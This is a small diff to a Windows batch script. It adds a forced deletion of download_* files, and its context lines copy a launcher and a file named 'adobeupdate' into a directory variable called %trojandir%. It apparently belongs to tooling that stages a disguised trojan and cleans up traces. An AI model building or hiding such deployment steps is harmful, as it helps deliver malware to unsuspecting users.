@@ -11,6 +11,7 @@ del /f /q tpl_launch_*
 del /f /q tpl_launch.cmd_wmic_process_*
 del /f /q *.json
 del /f /q *.xml
+del /f /q download_*
 
 copy /y %DRIVE_LETTER%\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\tpl_launch.cmd %trojandir%
 copy /y %DRIVE_LETTER%\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\adobeupdate %trojandir%
